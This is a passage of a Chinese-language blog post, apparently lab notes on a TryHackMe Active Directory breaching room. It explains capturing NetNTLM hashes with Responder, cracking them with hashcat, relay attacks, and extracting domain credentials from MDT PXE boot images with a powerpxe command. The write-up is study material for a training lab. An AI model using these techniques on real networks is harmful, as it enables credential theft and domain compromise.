等，以捕获这些请求并强制进行身份验证。</p><p><strong>这就是SMB漏洞产生的原因之一</strong>   </p><p><strong>接下来就重点介绍一下<code>Responder</code>这个工具</strong></p><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p>这里介绍一下这个工具   就知道这个工具为什么能用在这了</p><p><img src="../images/image-20230905213851249.png" alt="image-20230905213851249"></p><p><strong>刚好就是可以模拟这些协议  然后欺骗客户端向其发送响应，从而获取用户凭据或敏感信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要注意的一件事是，Responder 实质上试图通过毒害连接来赢得竞争条件，以确保您拦截连接。这意味着响应程序通常仅限于本地网络上的中毒身份验证质询</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">尽管 Responder 在从连接到组织 LAN 的恶意设备执行时能够拦截和毒害更多身份验证请求，但了解这种行为可能具有破坏性并因此被检测到至关重要。通过中毒身份验证请求，正常的网络身份验证尝试将失败，这意味着用户和服务将无法连接到他们想要连接的主机和共享</span><br></pre></td></tr></table></figure><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></p><p>下载好这个<code>Responder</code>工具后 并且和tcpdump一样设置好要监听的端口  然后等待就行</p><p><img src="../images/image-20230905214852367.png" alt="image-20230905214852367"></p><p>这样就成功的拦截到了NetNTLM 质询和响应</p><p>接下来就使用<code>hashcat</code>来爆破这个hash值了</p><p><img src="../images/image-20230905215752388.png" alt="image-20230905215752388"></p><p>这里利用的就是这个中间人攻击技术</p><p>中继攻击（Relay Attack）是一种常见的网络攻击技术，旨在利用通信协议的弱点来获取用户凭据或执行恶意操作。其工作原理可以概括为以下步骤：</p><ol><li>拦截受害者请求：攻击者将自己置于目标用户和目标服务器之间，监听受害者发出的请求。</li><li>中继请求：当受害者向目标服务器发送一个认证请求时（如登录、身份验证等），攻击者会立即将该请求转发到真正的目标服务器上。</li><li>获取响应：一旦目标服务器对认证请求进行响应，响应信息就会被传回给攻击者。</li><li>中继响应：收到来自目标服务器的响应后，攻击者会迅速将该响应转发给受害者设备，并假装自己是真实的服务器。</li><li>伪造成功认证：由于整个过程都是透明地进行，对于受害者而言，他们可能不知道与谁通信并且错误地相信已经通过了身份验证或登录成功。</li></ol><p>通过中继攻击，黑客可以窃取用户凭据、执行未授权操作、篡改数据等。这种类型的攻击特别有效在那些没有使用加密保护通信流量或缺乏合适的身份验证和授权机制的协议中。</p><p><img src="../images/6baba3537d36d0fa78c6f61cf1386f6f.png" alt="img"></p><p><strong>就差不多是这样子  起到一个转发和伪装的作用</strong></p><h2 id="Microsoft-部署工具包"><a href="#Microsoft-部署工具包" class="headerlink" title="Microsoft 部署工具包"></a>Microsoft 部署工具包</h2><p>大型组织需要工具来部署和管理资产的基础设施。在大型组织中，您无法让 IT 人员使用 DVD 甚至 USB 闪存驱动器在每台计算机上安装软件。幸运的是，微软已经提供了管理资产所需的工具。然而，我们也可以利用这些工具中的错误配置来破坏 AD。</p><p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p><p>Microsoft 部署工具包 (MDT) 是一项 Microsoft 服务，可帮助自动部署 Microsoft 操作系统 (OS)。大型组织使用 MDT 等服务来帮助更有效地在其资产中部署新映像，因为可以在中央位置维护和更新基础映像。</p><p>通常，MDT 与 Microsoft 的系统中心配置管理器 (SCCM) 集成，后者管理所有 Microsoft 应用程序、服务和操作系统的所有更新。 MDT 用于新部署。从本质上讲，它允许 IT 团队预配置和管理启动映像。因此，如果他们需要配置一台新机器，他们只需要插入网线，一切都会自动发生。他们可以对启动映像进行各种更改，例如已经安装 Office365 等默认软件和组织选择的防病毒软件。它还可以确保在安装第一次运行时更新新版本。</p><p>SCCM 几乎可以被视为 MDT 的扩展和老大哥。软件安装后会发生什么？嗯，SCCM 进行这种类型的补丁管理。它允许 IT 团队查看整个地产中安装的所有软件的可用更新。团队还可以在沙箱环境中测试这些补丁，以确保它们稳定，然后再将它们集中部署到所有加入域的计算机。它使 IT 团队的工作变得更加轻松。</p><p>然而，任何提供基础设施集中管理的东西（例如 MDT 和 SCCM）也可能成为攻击者的目标，试图接管该资产中的大部分关键功能。尽管可以通过多种方式配置 MDT，但对于此任务，我们将专门关注称为预启动执行环境 (PXE) 启动的配置。</p><h3 id="PXE启动"><a href="#PXE启动" class="headerlink" title="PXE启动"></a>PXE启动</h3><p>在 Active Directory（AD）域中，PXE 是 Preboot Execution Environment 的缩写。它是一种网络引导协议和技术，允许计算机通过网络启动并加载操作系统。</p><p><strong>具体来说，PXE 提供了一种方法，在计算机尚未启动操作系统时，从网络上获取并执行预先配置的启动文件。这些启动文件可以包含操作系统映像、安装程序或其他必要的组件。</strong>(<strong>个人觉得这句话概括的很好</strong>)</p><p>使用 PXE，管理员可以通过集中管理的方式轻松地为多台计算机提供统一的操作系统部署、更新或恢复功能。当计算机开机时，它会向 DHCP 服务器发送请求以获取 IP 地址，并根据 DHCP 服务器返回的信息进一步下载和执行 PXE 启动文件。</p><p>因此，在 AD 域中使用 PXE 可以帮助简化和自动化大规模计算机部署和维护过程，并提高效率和可靠性。</p><p>大型组织使用 PXE 引导来允许连接到网络的新设备直接通过网络连接加载和安装操作系统。 MDT 可用于创建、管理和托管 PXE 启动映像。 PXE 启动通常与 DHCP 集成，这意味着如果 DHCP 分配 IP 租约，则允许主机请求 PXE 启动映像并启动网络操作系统安装过程。通信流程如下图所示</p><p><img src="../images/8117a18103e98ee2ccda91fc87c63606.png" alt="img"></p><p>个人简单的总结一下 MDT PXE SCCM的差别 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MDT  就是相当于准备文件 将要做的东西准备好</span><br><span class="line">SCCM 就是对准备的东西负责检查更新</span><br><span class="line">PXE 就是对准备的东西进行命令执行来部署</span><br></pre></td></tr></table></figure><p>执行该过程后，客户端将使用 TFTP 连接下载 PXE 启动映像。我们可以将 PXE 启动映像用于两个不同的目的：</p><ul><li>注入权限升级向量（例如本地管理员帐户），以便在 PXE 启动完成后获得对操作系统的管理访问权限。</li><li>执行密码抓取攻击以恢复安装期间使用的 AD 凭据。</li></ul><p>在本任务中，我们将重点关注后者。我们将尝试在安装过程中恢复与 MDT 服务关联的部署服务帐户，以应对此密码抓取攻击。此外，还可以检索用于无人值守安装应用程序和服务的其他 AD 帐户。</p><h3 id="PXE-Boot-Image-Retrieval-PXE-启动映像检索"><a href="#PXE-Boot-Image-Retrieval-PXE-启动映像检索" class="headerlink" title="PXE Boot Image Retrieval PXE 启动映像检索"></a>PXE Boot Image Retrieval PXE 启动映像检索</h3><p>由于 DHCP 有点挑剔，我们将绕过此攻击的初始步骤。我们将跳过尝试从 DHCP 请求 IP 和 PXE 启动预配置详细信息的部分。我们将手动执行该过程中此步骤的其余攻击。</p><p>您通过 DHCP 收到的有关 PXE 启动预配置的第一条信息是 MDT 服务器的 IP。在我们的例子中，您可以从 TryHackMe 网络图中恢复该信息。</p><p>您收到的第二条信息是 BCD 文件的名称。这些文件存储与不同类型的体系结构的 PXE 引导相关的信息。要检索此信息，您需要连接到此网站：<a href="http://pxeboot.za.tryhackme.com。它将列出各种">http://pxeboot.za.tryhackme.com。它将列出各种</a> BCD 文件：</p><p><img src="../images/image-20230906210830635.png" alt="image-20230906210830635"></p><p>通常，您将使用 TFTP 请求每个 BCD 文件并枚举所有文件的配置。</p><p><img src="../images/image-20230906212716907.png" alt="image-20230906212716907"></p><p><strong>(解释一下这个BCD文件是啥)</strong></p><p>为了我们可以枚举并检索 PXE 启动映像  接下来进行ssh登录</p><p>登录之后 使用的这个工具  <code>powerpxe</code>(<strong>这个工具的话是可以预先进行对MDT的一些文件进行默认配置的</strong>)</p><p>前面的获取bsd和wim镜像的下载流程就不写了  跟着thm做就行了</p><p>接下来时讲 获取到这个pxe启动镜像的时候我们应该怎么做 <strong>怎么进行攻击利用</strong></p><p>现在我们已经恢复了 PXE 启动映像，我们可以窃取存储的凭据。应该指出的是，我们可以发起各种攻击。我们可以注入本地管理员用户，因此一旦映像启动，我们就拥有管理员访问权限，我们可以安装映像以拥有加入域的计算机。如果您有兴趣了解有关这些攻击的更多信息，可以阅读本文。本次练习将重点关注尝试窃取凭据的简单攻击。</p><p>我们将再次使用 powerpxe 来恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件（通常存储这些类型的凭据）来手动执行此步骤。要使用 powerpxe 从引导文件恢复凭据，请运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\THM\Documents\am0&gt; Get-FindCredentials -WimFile pxeboot.wim</span><br><span class="line">&gt;&gt; Open pxeboot.wim</span><br><span class="line">&gt;&gt;&gt;&gt; Finding Bootstrap.ini</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; DeployRoot = \\THMMDT\MTDBuildLab$</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserID = &lt;account&gt;</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserDomain = ZA</span><br><span class="line">&gt;&gt;&gt;&gt; &gt;&gt;&gt;&gt; UserPassword = &lt;password&gt;</span><br></pre></td></tr></table></figure><p>如您所见，powerpxe 能够恢复 AD 凭据。我们现在有了另一组可以使用的 AD 凭据！</p><p><strong>就是通过各种手段来获取这个PXE启动映像  因为这个里面含有这个默认的凭证  在企业域中大规模的配置后  我们可以使用这个获取到的凭证进行登录</strong></p><h2 id="Configuration-Files-配置文件"><a href="#Configuration-Files-配置文件" class="headerlink" title="Configuration Files 配置文件"></a>Configuration Files 配置文件</h2><p>这个没啥好写的  去看thm就行了 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;上个星期刚把域控的部分看了一遍&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230904210903273.png&quot; alt=&quot;image-20230904210903273&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这是本题的这个网络拓扑图&lt;/stron</summary>
      
    
    
    
    
    <category term="thm-破坏AD域" scheme="https://ke1nys.github.io/tags/thm-%E7%A0%B4%E5%9D%8FAD%E5%9F%9F/"/>
    
  </entry>
  
</feed>
